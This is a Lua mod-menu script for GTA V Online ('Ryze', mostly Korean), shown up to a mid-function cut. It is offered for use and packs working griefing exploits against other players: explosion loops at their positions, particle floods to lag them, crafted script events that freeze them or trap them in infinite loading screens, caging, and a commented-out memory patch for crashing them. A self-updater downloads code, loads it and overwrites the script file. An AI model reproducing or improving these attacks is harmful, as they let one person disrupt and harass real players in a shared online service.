--[[
    This was created by XxpichoclesxX#0427 with some help already mentioned in credits.
    The original download site should be github.com/xxpichoclesxx, if you got this script from anyone selling it, you got sadly scammed.
    Also this is only for some new stand people because is a trolling and online feature script, not recovery.
    So enjoy and pls join my discord, to know when the script is updated or be able to participate in polls.
]]

util.require_natives(1676318796)

util.toast("어서오세요 " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. " Al 스크립트!!")
util.toast("로딩 중 기다려주세요...(1-2초)")
local response = false
local localVer = 3.1
async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localVer ~= currentVer then
        util.toast("업데이트를 받을 수 있습니다. 업데이트 진행후 다시 시작합니다.")
        menu.action(menu.my_root(), "최신 버전 업데이트(설명 확인 후 실행)", {}, "최신 버전으로 업데이트 되지만 스페인어로 변경 될수 있습니다.", function()
            async_http.init('raw.githubusercontent.com','/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/Translations/RyzeStand_KOR.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("Github 수동 업데이트 진행 오류가 발생했습니다.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("스크립트 업데이트, 스크립트 다시 시작")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

--[[ 
    Adding In a Future Update
    resources_dir = filesystem.resources_dir() .. 'ryzescript/'
]]

--Because i love consuming resources >.<

util.log("                                           ")
util.log(".--.                .-.                 .  ")
util.log("|   )              (   )        o      _|_ ")
util.log("|--' .  .---..-.    `-.  .-..--..  .,-. |  ")
util.log("|  | |  | .'(.-'   (   )(   |   |  |   )|  ")
util.log("'   ``--|'---`--'   `-'  `-'' -' `-|`-' `-'")
util.log("        ;                          |       ")
util.log("     `-'                           '       ")

-- Local general tables

local spawned_objects = {}
local ladder_objects = {}
local remove_projectiles = false
local PapuCrash = false

local launch_vehicle = {"Lanzar Arriba", "Lanzar Adelante", "Lanzar Atras", "Lanzar Abajo", "Catapulta"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local int_min = -2147483647
local int_max = 2147483647

-- Ryze Functions

ryze = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,

    request_model_load = function(hash)
        request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end,

    cwash_in_progwess = function()
        kitty_alpha = 0
        kitty_alpha_incr = 0.01
        kitty_alpha_thread = util.create_thread(function (thr)
            while true do
                kitty_alpha = kitty_alpha + kitty_alpha_incr
                if kitty_alpha > 1 then
                    kitty_alpha = 1
                elseif kitty_alpha < 0 then 
                    kitty_alpha = 0
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)

        kitty_thread = util.create_thread(function (thr)
            starttime = os.clock()
            local alpha = 0
            while true do
                timepassed = os.clock() - starttime
                if timepassed > 3 then
                    kitty_alpha_incr = -0.01
                end
                if kitty_alpha == 0 then
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)
    end,

    modded_vehicles = {
        "dune2",
        "tractor",
        "dilettante2",
        "asea2",
        "cutter",
        "mesa2",
        "jet",
        "policeold1",
        "policeold2",
        "armytrailer2",
        "towtruck",
        "towtruck2",
        "cargoplane",
    },

    modded_weapons = {
        "weapon_railgun",
        "weapon_stungun",
        "weapon_digiscanner",
    },

    get_spawn_state = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
    end,

    get_interior_of_player = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    is_player_in_interior = function(player_id)
        return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
    end,

    get_random_pos_on_radius = function()
        local angle = random_float(0, 2 * math.pi)
        pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
        return pos
    end

    --[[
            PapuCrash = function()
        local addr = memory.scan("48 81 EC ? ? ? ? 48 8B E9 48 8B CA 0F 29 74 24 ? 48 8B DA") - 0x15
        local originalBytes = memory.read_uint(addr)
        if PapuCrash = true then
            memory.write_uint(addr, 2428703408)
            memory.write_uint(addr, 2428703920)
        else
            memory.write_uint(addr, originalBytes)
            memory.write_uint(addr, originalBytes)
        end
    end
    ]]
}

-- Local general script functions

function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

function yieldModelLoad(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function get_control_request(ent)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("통제 불능 "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function rotation_to_direction(rotation) 
    local adjusted_rotation = 
    { 
        x = (math.pi / 180) * rotation.x, 
        y = (math.pi / 180) * rotation.y, 
        z = (math.pi / 180) * rotation.z 
    }
    local direction = 
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

local function BlockSyncs(player_id, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end

function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

clear_radius = 100
function clear_area(radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end

local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end


local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end

local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end


--local function get_transition_state(pid)
--    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
--end

-- Menu dividers (Sections)

local selfc = menu.list(menu.my_root(), "셀프", {}, "자신에 대한 옵션")
local online = menu.list(menu.my_root(), "온라인", {}, "온라인 모드 옵션")
local world = menu.list(menu.my_root(), "세계", {}, "주변 옵션")
local detections = menu.list(menu.my_root(), "모더 감지", {}, "모더 감지 합니다.")
local protects = menu.list(menu.my_root(), "보호", {}, "모더로부터 자신을 보호하십시오.")
local vehicles = menu.list(menu.my_root(), "차량", {}, "차량 옵션")
local fun = menu.list(menu.my_root(), "게임이", {}, "재미의 기능 요소 :3")
local misc = menu.list(menu.my_root(), "기타", {}, "유용하고 빠른 지름길")

players.on_join(function(player_id)
    menu.divider(menu.player_root(player_id), "Ryze 스크립트")
    local ryzescriptd = menu.list(menu.player_root(player_id), "Ryze 스크립트")
    local malicious = menu.list(ryzescriptd, "악의적인")
    local trolling = menu.list(ryzescriptd, "트롤러")
    local friendly = menu.list(ryzescriptd, "우호적인")
    local vehicle = menu.list(ryzescriptd, "차량")
    local otherc = menu.list(ryzescriptd, "기타")



    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local explosion = 18
    local explosion_names = {
        [0] = "소",
        [1] = "중",
        [2] = "대",
        [3] = "특대"
    }

    local explosions = menu.list(malicious, "폭발 방법", {}, "")

    local explode_slider = menu.slider_text(explosions, "폭발", {"customexplode"}, "", explosion_names, function()
        local player_pos = players.get_position(player_id)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
    end)

    util.create_tick_handler(function()
        if not players.exists(player_id) then
            return false
        end

        local index = menu.get_value(explode_slider)

        switch index do
            case 1:
                explosion = 0
                break
            case 2:
                explosion = 34
                break
            case 3:
                explosion = 82
                break
            pluto_default:
                explosion = 18
        end
    end)

    menu.toggle_loop(explosions, "폭발 반복", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "아토마이저 반복", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "폭죽 폭발 반복", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)




    local flushes = menu.list(malicious, "반복", {}, "")

    menu.toggle_loop(flushes, "불기둥 반복", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield(5)
        end
    end)

    menu.toggle_loop(flushes, "물기둥 반복", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield(5)
        end
    end)




    menu.divider(malicious, "기타")

    local lagplay = menu.list(malicious, "라지 플레이어", {}, "")

    menu.toggle_loop(lagplay, "V1 방식", {"rlag"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V2 방식", {"rlag2"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V3 방식", {"rlag3"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V4 방식", {"rlag4"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V5 방식", {"rlag4"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    --menu.toggle_loop(lagplay, "Metodo V5", {rlag5}, "Lageo por entidades", function()
	--	local player_pos = players.get_position(player_id)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_ch_finale")
    --   GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
	--		"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    --    request_ptfx_asset("scr_ch_finale")
    --    while not STREAMING.HAS_MODEL_LOADED(447548909) do
	--		STREAMING.REQUEST_MODEL(447548909)
	--		end
	--	local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	--	local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
	--	spam_amount = 1000
	--	while spam_amount >= 2 do
	--		entities.create_vehicle(447548909, PlayerPedCoords, 0)
	--		spam_amount = spam_amount - 2
	--	end
	--end)

    local cageveh = menu.list(trolling, "케이지 차량", {}, "")

    menu.action(cageveh, "차량 케이지", {"cage"}, "", function()
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    local cage = menu.list(trolling, "플레이어 케이지", {}, "")
    menu.action(cage, "전기 케이지", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "관 케이지", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "화물 컨테이너", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "케이지 삭제", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("케이지 " .. entitycount .. " 삭제")
    end)

    menu.action(trolling, "플레이어 얼리기", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("플레이어는 가만히 있다.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)




    menu.divider(trolling, "기타")

    menu.action(trolling,"플레이어 납치하다", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)


        end
	end)

    local inf_loading = menu.list(trolling, "Pantalla de carga infinita", {}, "")
    menu.action(inf_loading, "Teleport a MC", {}, "", function()
        util.trigger_script_event(1 << player_id, {879177392, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})    
    end)

    menu.action(inf_loading, "아파트 방법", {}, "", function()
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
    end)
        
    menu.action_slider(inf_loading, "부패한 전화", {}, "스타일 선택 클릭", invites, function(index, name)
        switch name do
            case 1:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 1})
                util.toast("요트 초대")
            break
            case 2:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 2})
                util.toast("사무소 초대")
            break
            case 3:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 3})
                util.toast("클럽 초대장")
            break
            case 4:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 4})
                util.toast("사무소 차고 초대")
            break
            case 5:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 5})
                util.toast("성자 Cs 초대")
            break
            case 6:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 6})
                util.toast("아파트 초대")
            break
        end
    end)


    local freeze = menu.list(malicious, "얼리기 방법", {}, "")

    player_toggle_loop(freeze, player_id, "무대 얼리기", {}, "다른 사람들보다 더 잘 작동합니다.", function()
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
    end)

    player_toggle_loop(freeze, player_id, "Freeze Escena 2", {}, "Mas parcheado que el primero.", function()
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 0, 0, 0})
        util.yield(500)
    end)
    
    player_toggle_loop(freeze, player_id, "얼리기 V1", {}, "무료 메뉴얼에 비해 효과가 좋습니다.", function()
        util.trigger_script_event(1 << player_id, {434937615, player_id, 0, 1, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, player_id, "얼리기 폭풍", {}, "대부분의 메뉴에서는 거의 쓸모가 없습니다.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
    end)

    player_toggle_loop(freeze, player_id, "포텐셜 얼리기", {}, "한꺼번에 보내기.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {434937615, player_id, 0, 1, 0, 0})
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
        util.yield(500)
    end)




    --local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
	--menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
	--	local hash <const> = util.joaat(plane)
	--	request_model(hash)
	--	local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
	--	local pos = players.get_position(targetPed, 20.0, 20.0)
	--	pos.z = pos.z + 30.0
	--	local plane = entities.create_vehicle(hash, pos, 0.0)
	--	players.get_position(plane, targetPed, true)
	--	VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
	--	VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
	--end)

    glitchiar = menu.list(trolling, "디글리치 옵션", {}, "")


    player_toggle_loop(glitchiar, player_id, "버그 움직임", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
